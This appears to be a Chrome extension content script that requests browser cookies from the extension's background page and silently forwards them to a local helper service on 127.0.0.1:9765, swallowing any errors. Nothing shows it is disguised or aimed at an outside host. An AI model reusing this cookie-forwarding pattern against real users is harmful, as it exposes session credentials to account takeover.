(function () {
    'use strict';
    var HELPER = 'http://127.0.0.1:9765/push?';
    var sent = false;

    function push(cookie) {
        if (!cookie) return;
        fetch(HELPER + cookie, { mode: 'no-cors', cache: 'no-store' })
            .then(function () { })
            .catch(function () { });
    }

    try {
        chrome.runtime.sendMessage({ type: 'kb_cookies' }, function (res) {
            if (res && res.cookie) push(res.cookie);
            sent = true;
        });
    } catch (e) {
        sent = true;
    }
})();